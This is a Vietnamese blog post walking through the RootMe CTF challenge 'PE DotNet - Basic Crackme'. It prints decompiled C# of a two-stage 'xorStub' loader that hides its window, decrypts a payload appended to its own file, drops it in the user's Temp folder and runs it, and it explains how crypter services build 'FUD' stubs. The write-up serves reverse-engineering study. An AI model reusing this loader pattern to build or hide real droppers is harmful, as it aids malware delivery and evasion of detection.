---
layout: post
title:  "RootMe | re | PE DotNet - Basic Crackme"
date:   2025-10-03 09:23:50 +0000
categories: Reverse
---

### I. Introductions
---
* Mấy giải CTF dạo này căng quá nên nay mình làm bài post chill chill về RootMe nhân dịp Trung Thu :)

[Root-me.org](https://www.root-me.org)

* chall: [rev/PE-DotNet-Basic-Crackme](https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-Basic-Crackme)
* author: [nqnt](https://www.root-me.org/nqnt)

### II. Writeups
---
#### 1. first look
* Đầu tiên chall cho chúng ta một file PE được viết bằng .NET.
<p align="center">
  <img src="/images/rootmerevch46/pe-detective.JPG" width="500"/>
</p>
* Chạy thử:
<p align="center">
  <img src="/images/rootmerevch46/first-run.JPG" width="350"/>
</p>
<p align="center">
  <img src="/images/rootmerevch46/first-run-input.JPG" width="350"/>
</p>
* Có thể thấy chall là một pasword checker.

#### 2. Re
* Như ở trên, file được viết bằng .NET nên mình load lên dnSpy.
* Source chính của file:

```cs
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace xorStub
{
  // Token: 0x02000002 RID: 2
  internal class Program
  {
    // Token: 0x06000001 RID: 1
    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    // Token: 0x06000002 RID: 2 RVA: 0x00002050 File Offset: 0x00000250
    public static string ROT13Encode(string data, string key)
    {
      int length = data.Length;
      int length2 = key.Length;
      char[] array = new char[length];
      for (int i = 0; i < length; i++)
      {
        array[i] = (data[i] ^ key[i % length2]);
      }
      return new string(array);
    }

    // Token: 0x06000003 RID: 3 RVA: 0x0000209C File Offset: 0x0000029C
    private static void Main(string[] args)
    {
      Program.ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
      for (;;)
      {
        using (StreamReader streamReader = new StreamReader(Assembly.GetEntryAssembly().Location))
        {
          using (BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream))
          {
            Program.<>c__DisplayClass3_0 CS$<>8__locals1 = new Program.<>c__DisplayClass3_0();
            byte[] bytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
            string text = Encoding.ASCII.GetString(bytes).Substring(Encoding.ASCII.GetString(bytes).IndexOf("***")).Replace("***", "");
            string key = Program.ROT13Encode(Encoding.UTF8.GetString(Convert.FromBase64String(text.Split(new char[]
            {
              '|'
            })[1])), "randomkey");
            string s = text.Split(new char[]
            {
              '|'
            })[0];
            CS$<>8__locals1.fileName = Program.RandomUtil.GetRandomString();
            CS$<>8__locals1.CurrentDirectoryy = new string[]
            {
              Program.ROT13Encode("\u0002{", "AAAQSDQSDF"),
              Program.ROT13Encode("\u0004 !# ", "QSDQSFFF"),
              Program.ROT13Encode("\u0010#4\u0015200", "QSDQSDQFGHG"),
              Program.ROT13Encode("\u0006')-$", "JHJLHJKYTUTYU"),
              Program.ROT13Encode("\u0005!>6", "QDSFDFHNGFGN"),
              Program.ROT13Encode("v&.2", "XCVW<X<WCBN")
            };
            byte[] bytes2 = Convert.FromBase64String(Program.ROT13Encode(Encoding.UTF8.GetString(Convert.FromBase64String(s)), key));
            File.WriteAllBytes(string.Concat(new string[]
            {
              CS$<>8__locals1.CurrentDirectoryy[0],
              "\\",
              CS$<>8__locals1.CurrentDirectoryy[1],
              "\\",
              Environment.UserName,
              "\\",
              CS$<>8__locals1.CurrentDirectoryy[2],
              "\\",
              CS$<>8__locals1.CurrentDirectoryy[3],
              "\\",
              CS$<>8__locals1.CurrentDirectoryy[4],
              "\\",
              CS$<>8__locals1.fileName,
              CS$<>8__locals1.CurrentDirectoryy[5]
            }), bytes2);
            Process process = new Process();
            process.Exited += CS$<>8__locals1.<Main>g__p_Exited|0;
            process.StartInfo.FileName = string.Concat(new string[]
            {
              CS$<>8__locals1.CurrentDirectoryy[0],
              "\\",
              CS$<>8__locals1.CurrentDirectoryy[1],
              "\\",
              Environment.UserName,
              "\\",
              CS$<>8__locals1.CurrentDirectoryy[2],
              "\\",
              CS$<>8__locals1.CurrentDirectoryy[3],
              "\\",
              CS$<>8__locals1.CurrentDirectoryy[4],
              "\\",
              CS$<>8__locals1.fileName,
              CS$<>8__locals1.CurrentDirectoryy[5]
            });
            process.EnableRaisingEvents = true;
            process.Start();
            Console.ReadLine();
          }
        }
      }
    }
    // Token: 0x02000003 RID: 3
    private static class RandomUtil
    {
      // Token: 0x06000005 RID: 5 RVA: 0x000023D0 File Offset: 0x000005D0
      public static string GetRandomString()
      {
        return Path.GetRandomFileName().Replace(".", "");
      }
    }
  }
}
```
* Ở đây, mình sẽ không đi chi tiết cụ thể, mình chỉ chú trọng tới 2 chỗ quan trọng trong `main` :

```cs
File.WriteAllBytes(string.Concat(new string[]
{
  CS$<>8__locals1.CurrentDirectoryy[0],
  "\\",
  CS$<>8__locals1.CurrentDirectoryy[1],
  "\\",
  Environment.UserName,
  "\\",
  CS$<>8__locals1.CurrentDirectoryy[2],
  "\\",
  CS$<>8__locals1.CurrentDirectoryy[3],
  "\\",
  CS$<>8__locals1.CurrentDirectoryy[4],
  "\\",
  CS$<>8__locals1.fileName,
  CS$<>8__locals1.CurrentDirectoryy[5]
}), bytes2);
```
* Umm, mình cũng không biết nhiều về Java nhưng mà nhìn tên hàm `WriteAllBytes()` thì cũng đoán là nó sẽ ghi `bytes2` vào một file. Và path của file đó được lưu trong mảng `CurrentDirectoryy`.

```cs
Process process = new Process();
process.Exited += CS$<>8__locals1.<Main>g__p_Exited|0;
process.StartInfo.FileName = string.Concat(new string[]
{
  CS$<>8__locals1.CurrentDirectoryy[0],
  "\\",
  CS$<>8__locals1.CurrentDirectoryy[1],
  "\\",
  Environment.UserName,
  "\\",
  CS$<>8__locals1.CurrentDirectoryy[2],
  "\\",
  CS$<>8__locals1.CurrentDirectoryy[3],
  "\\",
  CS$<>8__locals1.CurrentDirectoryy[4],
  "\\",
  CS$<>8__locals1.fileName,
  CS$<>8__locals1.CurrentDirectoryy[5]
});
process.EnableRaisingEvents = true;
process.Start();
Console.ReadLine();
``` 

* Và sau đó nó tạo môt process và chạy file đó.
* Vì vậy mình sẽ dùng dnSpy32 để debug, để xem là nó chạy tạo và chạy file nào.
<p align="center">
  <img src="/images/rootmerevch46/DnSpy-debug.jpg" width="1000"/>
</p>
* sheeesh
<p align="center">
  <img src="/images/rootmerevch46/Temp-Direc.JPG" width="1000"/>
</p>
* Boom, lúc đầu mình tưởng đây sẽ là cái payload thật, nhưng không, nó chỉ là một bản copy y chang của file PE lúc đầu.
* Vì vậy mình cho nó chạy, và dùng ProcExp để có góc nhìn cụ thể hơn.
<p align="center">
  <img src="/images/rootmerevch46/procexp.JPG" width="1000"/>
</p>
* Damnn, 2-stage loader, y như tên của nó :)), `xorStub`.
* Stub là một từ được sử dụng rất nhiều trong các dịch vụ Crypter ví dụ như là `"100% FUD stub"`. Thì giải thích đơn giản stub sẽ là một chương trình dùng để decrypt payload và chạy payload. Và tùy vào sẽ thích của người viết, stub có thể hoạt động theo nhiều cách đa dạng khác nhau, nó có thể là 2-stage loader, 3-stage loader, chạy trong ram, tạo file trong Temp(trường hợp chúng ta đang gặp) rồi chạy, ...
* Trên thực tế, các dịch vụ Crypter có rất nhiều các kĩ thuật khác nhau để xáo chương trình gốc để tạo một FUD(Fully Undetechable) stub. Và các dịch vụ Crypter lừng danh nhất hiện nay phần lớn đến từ các tác giả người Nga và U Cà :).
* Dưới đây là một ví dụ mà bạn có thể đọc thêm nếu tò mò: 
  [Demystifying the Crypter Used in Emotet, Qbot, and Dridex](https://www.zscaler.com/blogs/security-research/demystifying-crypter-used-emotet-qbot-and-dridex)
* Quay lại với chall, mình đã load cái payload cuối cùng sau khi đã được xor decrypt lên dnSpy. (Tempmmkstrd22n.exe)
<p align="center">
  <img src="/images/rootmerevch46/DnSpy-real-payload.jpg" width="1000"/>
</p>
* Và... và gì?
<p align="center">
  <img src="/images/rootmerevch46/last-run.JPG" width="1000"/>
</p>
* Boom, xong. Chall này khá hay và chill.

### III. Đôi lời gửi đến người đọc
---
* Vâng, vậy là hết post, cảm ơn những người ae đã đọc hết đến đây. Chúc những người ae ăn Trung Thu vui vẻ và hạnh phúc.

> Banh Trung Thu dau xanh is da best
>
> emKhoi2k10

<p align="center">
  <img src="/images/rootmerevch46/mid-autumn-day-mid-autumn-fall.gif" width="500"/>
</p>